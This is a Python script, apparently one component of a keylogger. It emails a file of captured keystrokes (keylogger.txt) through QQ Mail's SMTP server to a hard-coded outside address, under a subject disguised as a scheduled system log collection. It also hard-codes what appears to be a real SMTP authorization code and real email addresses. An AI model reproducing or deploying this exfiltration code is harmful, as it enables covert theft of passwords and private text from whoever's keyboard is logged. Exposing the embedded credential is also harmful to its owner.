import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.mime.multipart import MIMEMultipart

KEY = "qrnqkvkfpxcmbidc"
sender = '392125238@qq.com'
receivers = ['783288242@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
senderName = "KeyBoardLogger"
receiverName = "杨丽杰老板"
title = "[系统邮件]定时日志回收"
text = '定时日志回收……'
filePath = "keylogger.txt"
# 创建一个带附件的实例
def sendEMail(KEY,sender,receivers,senderName,receiverName,title,text,filePath):
    message = MIMEMultipart()
    message['From'] = Header(senderName, 'utf-8')
    message['To'] = Header(receiverName, 'utf-8')
    subject = title
    message['Subject'] = Header(subject, 'utf-8')
    # 邮件正文内容
    message.attach(MIMEText(text, 'plain', 'utf-8'))
    # 构造附件1，传送当前目录下的 test.txt 文件
    att1 = MIMEText(open(filePath, 'rb').read(), 'base64', 'utf-8')
    att1["Content-Type"] = 'application/octet-stream'
    # 这里的filename可以任意写，写什么名字，邮件中显示什么名字
    att1["Content-Disposition"] = 'attachment; filename="keyboard_log.txt"'
    message.attach(att1)
    smtpObj = smtplib.SMTP_SSL('smtp.qq.com',465)
    smtpObj.login(sender, KEY)
    smtpObj.sendmail(sender, receivers, message.as_string())

if __name__ == '__main__':
    sendEMail(KEY,sender,receivers,senderName,receiverName,title,text,filePath)